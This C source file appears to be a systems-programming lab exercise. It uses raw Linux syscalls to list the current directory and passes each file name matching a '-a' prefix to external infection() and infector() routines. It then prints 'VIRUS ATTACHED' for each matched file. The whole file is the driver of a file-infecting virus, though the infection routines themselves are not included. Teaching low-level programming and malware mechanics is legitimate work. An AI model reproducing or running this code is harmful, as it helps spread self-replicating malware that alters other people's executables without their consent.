
#define SYS_GETDENTS    141
#define SYS_WRITE       4
#define SYS_OPEN        5
#define SYS_EXIT        1

#define O_RDWR          2
#define O_RDONLY        0
#define S_IRUSR         00400
#define S_IWUSR         00200

#define MAX_BUFF        8192
#define WD              "."
#define WD_ZERO         0
#define EXIT_CODE       0X55
#define STDOUT          1

extern int system_call();
extern int strlen(char *str);
extern void infection();
extern void infector(char *filename);

typedef struct ent {
    int inode;
    int offset;
    short len;
    char buff[1] ;
} ent;

int main (int argc , char* argv[], char* envp[]){
    char *Print_infected = "  VIRUS ATTACHED\n";
    int flag = 0;
    int prefixlen = 0;
    char buffer[MAX_BUFF];
    int fd = system_call(SYS_OPEN , WD ,O_RDONLY , S_IRUSR | S_IWUSR);

    if (fd<0)
        system_call(SYS_EXIT , EXIT_CODE);
    
    int i=0;
    while(i<argc){
        if (strlen(argv[i])>=2){
            if (argv[i][0]=='-'&&argv[i][1]=='a'){
                flag = i;
                prefixlen = strlen((argv[i]+2))-1;
            }
        }
        i++;
    }

    ent *entp =(ent *) buffer;
    int count = system_call(SYS_GETDENTS , fd , buffer , MAX_BUFF);
    int current_count = 0;
    current_count = current_count + entp->len;
    entp = (ent *) ((char *) entp + entp->len);
    current_count = current_count + entp->len;
    entp = (ent *) ((char *) entp + entp->len);

    if (count<0){
        system_call(SYS_EXIT , EXIT_CODE);
    }

    while (current_count<count){
        int found = 1;
        int nameSize = strlen(entp->buff);
        if (flag != 0){
            i = 0;
            while(i<prefixlen){
                if (nameSize<i)
                    found = 0;
                else if ((*(entp->buff+i))!=(*(argv[flag]+i+2)))
                    found = 0;
                i++;
            }
            if (found){
                infection();
                infector(entp->buff);
            }
        }

        system_call(SYS_WRITE , STDOUT , entp->buff , nameSize);
        if (found==1 && flag != 0){
            system_call(SYS_WRITE , STDOUT , Print_infected , strlen(Print_infected));
        }
        system_call(SYS_WRITE , STDOUT , "\n" , 1);
        current_count = current_count + entp->len;
        entp = (ent *)((char *)entp + entp->len);
    }
    return 0;
}